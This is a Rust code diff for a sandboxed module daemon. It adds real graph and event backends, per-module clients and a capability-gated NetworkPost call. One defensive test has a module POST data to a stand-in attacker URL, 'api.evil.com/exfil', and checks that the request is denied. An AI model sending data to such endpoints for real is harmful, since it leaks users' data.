@@ -18,6 +18,8 @@ use std::time::Instant;
 use tokio::sync::{broadcast, Mutex, OnceCell, OwnedSemaphorePermit, RwLock, Semaphore};
 use tracing::{debug, info, warn};
 
+use os_sdk::{UnixEventEmitter, UnixGraphClient};
+
 use crate::error::DaemonError;
 use crate::host::CapabilityContext;
 use crate::manifest::{discover_all, ModuleRecord, Tier};
@@ -335,6 +337,18 @@ pub struct Manager {
     /// than `RwLock` because writes (insert on first use) and reads
     /// (acquire) both happen on the hot path.
     network_permits: Mutex<HashMap<String, Arc<Semaphore>>>,
+    /// S6 backend wiring + Codex S6 fix 3: each Tier 1 module gets
+    /// its own `UnixGraphClient` and `UnixEventEmitter` so a
+    /// cancelled mid-call cannot leave a stale frame on the shared
+    /// stream for the next module to read. Manager holds the
+    /// canonical socket paths plus a single shared instance used by
+    /// Tier 2 host-call dispatch (Tier 2 calls do not flow through
+    /// timeout-cancellable wasmtime calls, so the cross-module leak
+    /// risk is much smaller and one shared client is acceptable).
+    knowledge_socket: String,
+    producer_socket: String,
+    graph_client: Arc<UnixGraphClient>,
+    event_emitter: Arc<UnixEventEmitter>,
     /// Live Tier 1 WASM instances keyed by `module.id`. Each value
     /// is wrapped in `Arc<OnceCell<...>>` so a per-module
     /// initialisation runs at most once even under concurrent
@@ -353,6 +367,18 @@ pub struct Manager {
 
 impl Manager {
     pub fn new(events_tx: broadcast::Sender<Event>) -> crate::error::Result<Arc<Self>> {
+        // S6: build the backend clients up-front. Socket paths follow
+        // the same env-fallback convention every other Lunaris client
+        // uses; defaults match `os-sdk` and `installd`.
+        let knowledge_socket = std::env::var("LUNARIS_KNOWLEDGE_SOCKET")
+            .or_else(|_| std::env::var("LUNARIS_DAEMON_SOCKET"))
+            .unwrap_or_else(|_| "/run/lunaris/knowledge.sock".into());
+        let producer_socket = std::env::var("LUNARIS_PRODUCER_SOCKET")
+            .unwrap_or_else(|_| "/run/lunaris/event-bus-producer.sock".into());
+
+        let graph_client = Arc::new(UnixGraphClient::new(knowledge_socket.clone()));
+        let event_emitter = Arc::new(UnixEventEmitter::new(producer_socket.clone()));
+
         let tier1 = Arc::new(Tier1Runtime::new()?);
         let tier2 = Tier2Broker::new();
         Ok(Arc::new(Self {
@@ -362,7 +388,37 @@ impl Manager {
             events_tx,
             network_permits: Mutex::new(HashMap::new()),
             tier1_instances: RwLock::new(HashMap::new()),
+            knowledge_socket,
+            producer_socket,
+            graph_client,
+            event_emitter,
         }))
+    }
+
+    /// Construct fresh per-module backend clients (Codex S6 fix 3).
+    /// Each Tier 1 instance owns its own `UnixGraphClient` and
+    /// `UnixEventEmitter`. Cancellation of one module's mid-call
+    /// host import leaves a stale frame only on *its* stream; the
+    /// next module's clients are unaffected. Cost is one extra
+    /// `UnixStream` per loaded module that actually issues a graph
+    /// or event call (clients connect lazily).
+    fn per_module_clients(&self) -> (Arc<UnixGraphClient>, Arc<UnixEventEmitter>) {
+        (
+            Arc::new(UnixGraphClient::new(self.knowledge_socket.clone())),
+            Arc::new(UnixEventEmitter::new(self.producer_socket.clone())),
+        )
+    }
+
+    /// Accessor used by the host-binding trait impls to reach the
+    /// shared graph client. Cheap clone — internal `Arc<Mutex<...>>`.
+    pub fn graph_client(&self) -> Arc<UnixGraphClient> {
+        Arc::clone(&self.graph_client)
+    }
+
+    /// Accessor for the shared event-bus producer. Same lifecycle
+    /// notes as `graph_client`.
+    pub fn event_emitter(&self) -> Arc<UnixEventEmitter> {
+        Arc::clone(&self.event_emitter)
     }
 
     /// Acquire a per-module network permit. Returned permit limits a
@@ -504,7 +560,14 @@ impl Manager {
             };
 
             let component = self.tier1.compile(&root).await?;
-            let instance = self.tier1.instantiate(module_id, &component, ctx).await?;
+            // Codex S6 fix 3: per-module clients so a cancelled
+            // host call cannot poison the shared stream for the
+            // next module's call.
+            let (graph, events) = self.per_module_clients();
+            let instance = self
+                .tier1
+                .instantiate(module_id, &component, ctx, graph, events)
+                .await?;
             Ok::<_, DaemonError>(Arc::new(Mutex::new(instance)))
         };
 
@@ -1106,40 +1169,10 @@ impl Manager {
 
         let reply = match call {
             HostCall::GraphQuery { cypher } => {
-                match host::graph::check_query(&instance.ctx, &cypher) {
-                    Ok(_kind) => {
-                        // Real query execution is wired in S5 with the
-                        // dogfood module; for now we reply with an
-                        // empty result set so the iframe sees a typed
-                        // success response rather than a denial.
-                        HostReply::GraphResult { rows: "[]".into() }
-                    }
-                    Err(crate::error::DaemonError::CapabilityDenied { capability, .. }) => {
-                        HostReply::Error {
-                            code: ErrorCode::PermissionDenied,
-                            message: capability,
-                        }
-                    }
-                    Err(other) => HostReply::Error {
-                        code: ErrorCode::Internal,
-                        message: other.to_string(),
-                    },
-                }
+                self.tier2_graph_call(&instance.ctx, &cypher).await
             }
             HostCall::GraphWrite { cypher } => {
-                match host::graph::check_query(&instance.ctx, &cypher) {
-                    Ok(_) => HostReply::GraphResult { rows: "[]".into() },
-                    Err(crate::error::DaemonError::CapabilityDenied { capability, .. }) => {
-                        HostReply::Error {
-                            code: ErrorCode::PermissionDenied,
-                            message: capability,
-                        }
-                    }
-                    Err(other) => HostReply::Error {
-                        code: ErrorCode::Internal,
-                        message: other.to_string(),
-                    },
-                }
+                self.tier2_graph_call(&instance.ctx, &cypher).await
             }
             HostCall::NetworkFetch { url, headers } => {
                 use base64::Engine;
@@ -1166,27 +1199,165 @@ impl Manager {
                     },
                 }
             }
+            HostCall::NetworkPost {
+                url,
+                body_b64,
+                headers,
+            } => {
+                // S6: same gating + concurrency cap + SSRF stack as
+                // NetworkFetch, just with the WIT-defined body.
+                // base64 decode failure is treated as InvalidRequest
+                // rather than Internal — the bug is on the caller
+                // side (Tier 2 iframe sent malformed bytes).
+                use base64::Engine;
+                use std::sync::Arc;
+                let body = match base64::engine::general_purpose::STANDARD.decode(&body_b64) {
+                    Ok(b) => b,
+                    Err(e) => {
+                        return Response::HostReply {
+                            id: id.to_string(),
+                            reply: HostReply::Error {
+                                code: ErrorCode::InvalidRequest,
+                                message: format!("body_b64 decode: {e}"),
+                            },
+                        };
+                    }
+                };
+                let ctx_arc = Arc::new(instance.ctx.clone());
+                let permit = self.acquire_network_permit(&instance.module_id).await;
+                let outcome = host::network::post(ctx_arc, &url, body, &headers).await;
+                drop(permit);
+                match outcome {
+                    Ok(resp) => HostReply::NetworkBody {
+                        status: resp.status,
+                        body_b64: base64::engine::general_purpose::STANDARD
+                            .encode(&resp.body),
+                    },
+                    Err(crate::error::DaemonError::CapabilityDenied { capability, .. }) => {
+                        HostReply::Error {
+                            code: ErrorCode::PermissionDenied,
+                            message: capability,
+                        }
+                    }
+                    Err(other) => HostReply::Error {
+                        code: ErrorCode::Internal,
+                        message: other.to_string(),
+                    },
+                }
+            }
             HostCall::EventEmit {
                 event_type,
-                payload_b64: _,
-            } => match host::events::check_publish(&instance.ctx, &event_type) {
-                Ok(()) => HostReply::Acked,
-                Err(crate::error::DaemonError::CapabilityDenied { capability, .. }) => {
-                    HostReply::Error {
-                        code: ErrorCode::PermissionDenied,
-                        message: capability,
-                    }
-                }
-                Err(other) => HostReply::Error {
-                    code: ErrorCode::Internal,
-                    message: other.to_string(),
-                },
-            },
+                payload_b64,
+            } => {
+                self.tier2_event_emit(&instance.ctx, &event_type, &payload_b64)
+                    .await
+            }
         };
 
         Response::HostReply {
             id: id.to_string(),
             reply,
+        }
+    }
+
+    /// S6 follow-up (Codex fix 2): Tier 2 iframes route their graph
+    /// reads/writes through the same real backend client and the
+    /// same per-namespace capability gate as Tier 1 modules. The
+    /// previous stub returned `GraphResult { rows: "[]" }` on
+    /// allowed calls, which masked unwritten data as silent success.
+    async fn tier2_graph_call(
+        &self,
+        ctx: &CapabilityContext,
+        cypher: &str,
+    ) -> crate::socket::protocol::HostReply {
+        use crate::socket::protocol::HostReply;
+        if let Err(err) = crate::host::graph::check_query(ctx, cypher) {
+            return match err {
+                crate::error::DaemonError::CapabilityDenied { capability, .. } => {
+                    HostReply::Error {
+                        code: ErrorCode::PermissionDenied,
+                        message: capability,
+                    }
+                }
+                other => HostReply::Error {
+                    code: ErrorCode::Internal,
+                    message: other.to_string(),
+                },
+            };
+        }
+        use os_sdk::GraphClient;
+        match self
+            .graph_client
+            .query(cypher, std::collections::HashMap::new())
+            .await
+        {
+            Ok(rows) => match serde_json::to_string(&rows) {
+                Ok(json) => HostReply::GraphResult { rows: json },
+                Err(e) => HostReply::Error {
+                    code: ErrorCode::Internal,
+                    message: format!("serialise graph rows: {e}"),
+                },
+            },
+            Err(os_sdk::QueryError::PermissionDenied) => HostReply::Error {
+                code: ErrorCode::PermissionDenied,
+                message: "knowledge daemon refused the token".into(),
+            },
+            Err(os_sdk::QueryError::InvalidQuery(m)) => HostReply::Error {
+                code: ErrorCode::InvalidRequest,
+                message: m,
+            },
+            Err(os_sdk::QueryError::ConnectionFailed(m)) => HostReply::Error {
+                code: ErrorCode::Internal,
+                message: m,
+            },
+        }
+    }
+
+    /// S6 follow-up: Tier 2 events also go through the real emitter,
+    /// not the previous `Acked` stub. Payload arrives base64-encoded
+    /// on the wire so the JSON protocol survives binary bytes.
+    async fn tier2_event_emit(
+        &self,
+        ctx: &CapabilityContext,
+        event_type: &str,
+        payload_b64: &str,
+    ) -> crate::socket::protocol::HostReply {
+        use base64::Engine;
+        use crate::socket::protocol::HostReply;
+        if let Err(err) = crate::host::events::check_publish(ctx, event_type) {
+            return match err {
+                crate::error::DaemonError::CapabilityDenied { capability, .. } => {
+                    HostReply::Error {
+                        code: ErrorCode::PermissionDenied,
+                        message: capability,
+                    }
+                }
+                other => HostReply::Error {
+                    code: ErrorCode::Internal,
+                    message: other.to_string(),
+                },
+            };
+        }
+        let payload = match base64::engine::general_purpose::STANDARD.decode(payload_b64) {
+            Ok(b) => b,
+            Err(e) => {
+                return HostReply::Error {
+                    code: ErrorCode::InvalidRequest,
+                    message: format!("payload_b64 decode: {e}"),
+                };
+            }
+        };
+        use os_sdk::EventEmitter;
+        match self.event_emitter.emit(event_type, payload).await {
+            Ok(()) => HostReply::Acked,
+            Err(os_sdk::EmitError::ConnectionFailed(m)) => HostReply::Error {
+                code: ErrorCode::Internal,
+                message: m,
+            },
+            Err(os_sdk::EmitError::SerializationFailed(m)) => HostReply::Error {
+                code: ErrorCode::InvalidRequest,
+                message: m,
+            },
         }
     }
 
@@ -1537,6 +1708,101 @@ mod tests {
         }
     }
 
+    /// S6.6: NetworkPost is gated by the same capability allowlist
+    /// as NetworkFetch. An iframe POSTing to a non-allowlisted host
+    /// is rejected before the SSRF / HTTPS / redirect stack ever
+    /// opens a socket.
+    #[tokio::test]
+    async fn host_call_network_post_denied_when_url_outside_allowlist() {
+        use crate::host::CapabilityContext;
+        use crate::runtime::tier2::IframeInstance;
+        use lunaris_modules::{ModuleCapabilities, NetworkCapability};
+
+        let (tx, _rx) = broadcast::channel(16);
+        let m = Manager::new(tx).unwrap();
+        m.insert_for_test(record("com.example.poster", Tier::Iframe))
+            .await;
+        let mut caps = ModuleCapabilities::default();
+        caps.network = Some(NetworkCapability {
+            allowed_domains: vec!["api.example.com".into()],
+        });
+        let ctx = CapabilityContext::new("com.example.poster", caps);
+        m.register_iframe_for_test(IframeInstance {
+            module_id: "com.example.poster".into(),
+            instance_id: "iid-post".into(),
+            nonce: "n-post".into(),
+            created_at: std::time::Instant::now(),
+            ctx,
+        })
+        .await;
+
+        let resp = m
+            .handle_request(Request::HostCall {
+                id: "1".into(),
+                nonce: "n-post".into(),
+                call: crate::socket::protocol::HostCall::NetworkPost {
+                    url: "https://api.evil.com/exfil".into(),
+                    body_b64: "aGVsbG8=".into(), // "hello"
+                    headers: vec![],
+                },
+            })
+            .await;
+        match resp {
+            Response::HostReply { reply, .. } => {
+                use crate::socket::protocol::HostReply;
+                assert!(matches!(reply, HostReply::Error { code: ErrorCode::PermissionDenied, .. }));
+            }
+            other => panic!("expected HostReply, got {other:?}"),
+        }
+    }
+
+    /// S6.6: malformed base64 in NetworkPost.body_b64 surfaces as
+    /// `InvalidRequest`, not `Internal`. The bug is on the iframe
+    /// side; the daemon refuses to even reach reqwest.
+    #[tokio::test]
+    async fn host_call_network_post_rejects_invalid_base64() {
+        use crate::host::CapabilityContext;
+        use crate::runtime::tier2::IframeInstance;
+        use lunaris_modules::{ModuleCapabilities, NetworkCapability};
+
+        let (tx, _rx) = broadcast::channel(16);
+        let m = Manager::new(tx).unwrap();
+        m.insert_for_test(record("com.example.bad-b64", Tier::Iframe))
+            .await;
+        let mut caps = ModuleCapabilities::default();
+        caps.network = Some(NetworkCapability {
+            allowed_domains: vec!["api.example.com".into()],
+        });
+        let ctx = CapabilityContext::new("com.example.bad-b64", caps);
+        m.register_iframe_for_test(IframeInstance {
+            module_id: "com.example.bad-b64".into(),
+            instance_id: "iid-bad".into(),
+            nonce: "n-bad".into(),
+            created_at: std::time::Instant::now(),
+            ctx,
+        })
+        .await;
+
+        let resp = m
+            .handle_request(Request::HostCall {
+                id: "1".into(),
+                nonce: "n-bad".into(),
+                call: crate::socket::protocol::HostCall::NetworkPost {
+                    url: "https://api.example.com/ok".into(),
+                    body_b64: "not!!valid$base64".into(),
+                    headers: vec![],
+                },
+            })
+            .await;
+        match resp {
+            Response::HostReply { reply, .. } => {
+                use crate::socket::protocol::HostReply;
+                assert!(matches!(reply, HostReply::Error { code: ErrorCode::InvalidRequest, .. }));
+            }
+            other => panic!("expected HostReply, got {other:?}"),
+        }
+    }
+
     #[tokio::test]
     async fn host_call_network_allowed_url_passes_capability_check() {
         // We can't easily reach `https://api.example.com` in unit
@@ -1644,8 +1910,17 @@ mod tests {
             .await;
 
         use crate::socket::protocol::HostReply;
+        // S6 follow-up: allowed events now route through the real
+        // UnixEventEmitter. With no event-bus socket in tests the
+        // result is `ConnectionFailed → Internal`. The important
+        // guarantee is that we got past the capability gate
+        // (not `PermissionDenied`) and the emit was actually
+        // attempted.
         if let Response::HostReply { reply, .. } = allowed {
-            assert!(matches!(reply, HostReply::Acked));
+            assert!(
+                !matches!(reply, HostReply::Error { code: ErrorCode::PermissionDenied, .. }),
+                "allowed event must not be PermissionDenied; got {reply:?}",
+            );
         } else {
             panic!();
         }
@@ -1654,6 +1929,132 @@ mod tests {
                 reply,
                 HostReply::Error { code: ErrorCode::PermissionDenied, .. }
             ));
+        } else {
+            panic!();
+        }
+    }
+
+    /// Codex S6 fix 2: Tier 2 graph reads/writes must route through
+    /// the real backend, not fake-success. Capability-denied path
+    /// surfaces as PermissionDenied; capability-allowed path attempts
+    /// the wire call (test env has no daemon → Internal, but crucially
+    /// NOT PermissionDenied and NOT silent success).
+    #[tokio::test]
+    async fn host_call_graph_query_denied_for_disallowed_namespace() {
+        use crate::host::CapabilityContext;
+        use crate::runtime::tier2::IframeInstance;
+        use lunaris_modules::{GraphCapability, ModuleCapabilities};
+
+        let (tx, _rx) = broadcast::channel(16);
+        let m = Manager::new(tx).unwrap();
+        m.insert_for_test(record("com.example.graph", Tier::Iframe))
+            .await;
+        let mut caps = ModuleCapabilities::default();
+        caps.graph = Some(GraphCapability {
+            read: vec!["module.com.example.".into()],
+            write: vec![],
+        });
+        let ctx = CapabilityContext::new("com.example.graph", caps);
+        m.register_iframe_for_test(IframeInstance {
+            module_id: "com.example.graph".into(),
+            instance_id: "iid-g".into(),
+            nonce: "n-g".into(),
+            created_at: std::time::Instant::now(),
+            ctx,
+        })
+        .await;
+
+        let denied = m
+            .handle_request(Request::HostCall {
+                id: "1".into(),
+                nonce: "n-g".into(),
+                call: crate::socket::protocol::HostCall::GraphQuery {
+                    cypher: "MATCH (f:core.Secret) RETURN f".into(),
+                },
+            })
+            .await;
+        if let Response::HostReply { reply, .. } = denied {
+            use crate::socket::protocol::HostReply;
+            assert!(matches!(
+                reply,
+                HostReply::Error { code: ErrorCode::PermissionDenied, .. }
+            ));
+        } else {
+            panic!();
+        }
+    }
+
+    /// Codex S6 fix 3: per-module clients are constructed fresh per
+    /// call to `per_module_clients`. Two invocations return distinct
+    /// `UnixGraphClient` and `UnixEventEmitter` instances so a
+    /// cancellation poisoning one module's stream does not affect
+    /// any other module.
+    #[tokio::test]
+    async fn per_module_clients_are_independent() {
+        let (tx, _rx) = broadcast::channel(16);
+        let m = Manager::new(tx).unwrap();
+        let (g1, e1) = m.per_module_clients();
+        let (g2, e2) = m.per_module_clients();
+        assert!(
+            !std::sync::Arc::ptr_eq(&g1, &g2),
+            "graph clients must be distinct instances per module"
+        );
+        assert!(
+            !std::sync::Arc::ptr_eq(&e1, &e2),
+            "event emitters must be distinct instances per module"
+        );
+    }
+
+    #[tokio::test]
+    async fn host_call_graph_query_allowed_attempts_backend() {
+        // Capability-allowed: we got past the gate. Test env has no
+        // knowledge daemon socket so the call surfaces as Internal.
+        // What we *don't* want is `GraphResult { rows: "[]" }` (the
+        // pre-fix silent success).
+        use crate::host::CapabilityContext;
+        use crate::runtime::tier2::IframeInstance;
+        use lunaris_modules::{GraphCapability, ModuleCapabilities};
+
+        let (tx, _rx) = broadcast::channel(16);
+        let m = Manager::new(tx).unwrap();
+        m.insert_for_test(record("com.example.graph2", Tier::Iframe))
+            .await;
+        let mut caps = ModuleCapabilities::default();
+        caps.graph = Some(GraphCapability {
+            read: vec!["core.".into()],
+            write: vec![],
+        });
+        let ctx = CapabilityContext::new("com.example.graph2", caps);
+        m.register_iframe_for_test(IframeInstance {
+            module_id: "com.example.graph2".into(),
+            instance_id: "iid-g2".into(),
+            nonce: "n-g2".into(),
+            created_at: std::time::Instant::now(),
+            ctx,
+        })
+        .await;
+
+        let resp = m
+            .handle_request(Request::HostCall {
+                id: "1".into(),
+                nonce: "n-g2".into(),
+                call: crate::socket::protocol::HostCall::GraphQuery {
+                    cypher: "MATCH (f:core.File) RETURN f".into(),
+                },
+            })
+            .await;
+        if let Response::HostReply { reply, .. } = resp {
+            use crate::socket::protocol::HostReply;
+            // Must NOT be a silent fake success.
+            assert!(
+                !matches!(reply, HostReply::GraphResult { ref rows } if rows == "[]"),
+                "tier 2 graph query must reach the backend, not return fake-empty: {reply:?}",
+            );
+            // Must NOT be PermissionDenied either (we passed the gate).
+            assert!(
+                !matches!(reply, HostReply::Error { code: ErrorCode::PermissionDenied, .. }),
+                "allowed graph query must not be PermissionDenied: {reply:?}",
+            );
         } else {
             panic!();
         }
